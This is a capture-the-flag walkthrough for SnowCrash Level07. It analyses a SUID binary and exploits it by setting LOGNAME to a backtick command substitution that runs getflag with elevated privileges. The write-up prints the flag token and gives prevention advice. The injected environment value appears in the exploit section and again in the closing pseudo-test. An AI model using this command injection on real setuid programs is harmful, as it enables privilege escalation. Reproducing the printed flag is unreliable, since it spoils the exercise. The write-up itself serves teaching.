# Level07

## Flag

fiumuikeil55xe9cu4dood66h

---

## Discovery

### Checking the directory contents

```
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Observation: the executable belongs to user **flag07** and group **level07**, and has the SUID/SGID bit set. When running the file:

```
level07@SnowCrash:~$ ./level07 
level07
```

The program prints its own name.

### Analyzing the executable

```
level07@SnowCrash:~$ nm ./level07 
...
08048514 T main
         U setresgid@@GLIBC_2.0
         U setresuid@@GLIBC_2.0
         U system@@GLIBC_2.0
```

Conclusion: the program calls **system()** — this is a potential exploitation point.

### Dynamic analysis via ltrace

```
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 
getegid()                               = 2007
geteuid()                               = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME")                       = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 --- SIGCHLD (Child exited) ---
<... system resumed> )                  = 0
+++ exited (status 0) +++
```

Analysis:

* Reading an environment variable: `getenv("LOGNAME") = "level07"`
* Building a string: `asprintf(..., "level07") = 18` — the program constructs a string for output using LOGNAME
* Calling an external command:
  `system("/bin/echo level07 "level07` — prints the value of LOGNAME

Experiment:

```
level07@SnowCrash:~$ LOGNAME=level08 ./level07 
level08
```

The output changed — the program uses the LOGNAME environment variable to build the command.

---

## Use (Exploit)

### Running getflag via LOGNAME substitution

Since system() executes a command using LOGNAME, we can pass `getflag` as the value of the environment variable:

```
level07@SnowCrash:~$ LOGNAME=getflag ./level07 
getflag
level07@SnowCrash:~$ LOGNAME='getflag' ./level07 
getflag
level07@SnowCrash:~$ LOGNAME='`getflag`' ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

The flag was successfully obtained through the vulnerability associated with constructing a system command using an environment variable.

---

## Prevention

* Do not use **system()** with environment variables controlled by the user.
* Always validate and sanitize user input before calling system commands.
* When working with SUID/SGID binaries, strictly limit command injection points.

---

## Documentation

* man getenv
* man system
* man ltrace
* man setuid
* man bash

---

## Automatic Testing

Pseudo‑test to check for the vulnerability:

```
LOGNAME='`getflag`' ./level07 | grep "Check flag"
# Should output the token: fiumuikeil55xe9cu4dood66h
```